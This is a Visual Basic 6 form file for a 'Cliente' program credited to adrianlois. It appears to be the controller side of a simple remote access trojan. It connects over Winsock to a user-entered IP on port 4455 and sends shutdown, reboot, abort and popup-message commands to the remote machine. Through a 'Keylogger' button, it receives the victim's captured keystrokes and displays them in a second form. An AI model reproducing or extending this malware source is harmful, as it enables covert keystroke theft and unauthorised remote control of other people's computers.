VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   Caption         =   "Cliente by adrianlois"
   ClientHeight    =   3345
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   5970
   LinkTopic       =   "Form1"
   ScaleHeight     =   3345
   ScaleWidth      =   5970
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command8 
      Caption         =   "Enviar"
      Height          =   375
      Left            =   3120
      TabIndex        =   11
      Top             =   2760
      Width           =   1455
   End
   Begin VB.TextBox Text4 
      Height          =   1575
      Left            =   1920
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   10
      Top             =   1080
      Width           =   3855
   End
   Begin VB.CommandButton Command6 
      Caption         =   "Reiniciar"
      Height          =   375
      Left            =   240
      TabIndex        =   9
      Top             =   1560
      Width           =   1455
   End
   Begin VB.CommandButton Command5 
      Caption         =   "Abortar"
      Height          =   375
      Left            =   240
      TabIndex        =   8
      Top             =   2040
      Width           =   1455
   End
   Begin VB.CommandButton Command4 
      Caption         =   "Shutdown"
      Height          =   375
      Left            =   240
      TabIndex        =   7
      Top             =   1080
      Width           =   1455
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Keylogger"
      Height          =   375
      Left            =   240
      TabIndex        =   6
      Top             =   2760
      Width           =   1455
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Desconectar"
      Height          =   615
      Left            =   4320
      TabIndex        =   5
      Top             =   240
      Width           =   1455
   End
   Begin MSWinsockLib.Winsock Sock1 
      Left            =   5280
      Top             =   2760
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Conectar"
      Height          =   615
      Left            =   2760
      TabIndex        =   4
      Top             =   240
      Width           =   1455
   End
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   1200
      TabIndex        =   1
      Text            =   "4455"
      Top             =   600
      Width           =   1335
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   1200
      TabIndex        =   0
      Top             =   240
      Width           =   1335
   End
   Begin VB.PictureBox Picture1 
      Height          =   3615
      Left            =   -240
      Picture         =   "Cliente.frx":0000
      ScaleHeight     =   3555
      ScaleWidth      =   6195
      TabIndex        =   12
      Top             =   960
      Width           =   6255
   End
   Begin VB.Label Label2 
      Caption         =   "PUERTO"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   240
      TabIndex        =   3
      Top             =   600
      Width           =   855
   End
   Begin VB.Label Label1 
      Caption         =   "IP"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   840
      TabIndex        =   2
      Top             =   240
      Width           =   255
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
Sock1.Close
Sock1.Connect Text1.Text, 4455
End Sub

Private Sub Command2_Click()
Dim inResponse As Integer
intResponse = MsgBox("¿Estas seguro que deseas desconectarte?", _
vbYesNo + vbQuestion, _
"by adrianlois")
If intResponse = vbYes Then
Sock1.Close
Form1.Caption = "No conectado"
End If
End Sub

Private Sub Command3_Click()
Form2.Show
End Sub

Private Sub Command4_Click()
Sock1.SendData "Apagar"
End Sub

Private Sub Command5_Click()
Sock1.SendData "Abortar"
End Sub

Private Sub Command6_Click()
Sock1.SendData "Reiniciar"
End Sub

Private Sub Command8_Click()
Sock1.SendData "message|" & Text4.Text
End Sub


Private Sub Sock1_Connect()
Form1.Caption = "Conexion establecida"
End Sub

Private Sub Sock1_DataArrival(ByVal bytesTotal As Long)
Dim keys As String
Sock1.GetData keys, vbString
Form2.Text1.Text = Form2.Text1.Text & keys
End Sub

Private Sub Sock1_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Form1.Caption = "Error de conexion"
End Sub

